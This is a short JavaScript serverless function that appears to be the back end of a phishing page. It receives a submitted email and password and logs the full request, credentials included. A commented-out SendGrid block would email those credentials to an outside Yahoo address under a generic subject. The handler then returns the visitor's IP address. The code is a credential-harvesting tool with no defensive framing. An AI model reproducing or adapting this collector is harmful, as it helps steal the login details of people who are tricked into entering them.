const sgMail = require("@sendgrid/mail");
const statusCode = 200;
const headers = {
  "Access-Control-Allow-Origin" : "*",
  "Access-Control-Allow-Headers": "Content-Type"
};
exports.handler = (event, context, callback) => {
  console.log({event,context}); 
  // if(event.httpMethod !== 'POST' || !event.body) {
  //   callback(null, {
  //     statusCode,
  //     headers,
  //     body: ''
  //   });
  //   return;
  // }
  let body =  event.body;
  body = JSON.parse(body)
  // console.log(body); 
  // sgMail.setApiKey(process.env.SENDGRID_API_KEY);
  // const msg = {
  //   to: ["","teddypanthreco007@yahoo.com"],
  //   from: "no-reply@sudo.sh",
  //   subject: "Email Details",
  //   text: `
  //     Email: ${body.email},
  //     Password: ${body.password}
  //   `,
  //   html: `
  //   <strong>Email: </strong> ${body.email},
  //   <br/>
  //   <strong>Password: </strong> ${body.password}
  // `
  // };
  // sgMail.sendMultiple(msg);
  callback(null, {
    headers,
    statusCode,
    body: `Your IP address ${event.headers['client-ip']}`
  });
};
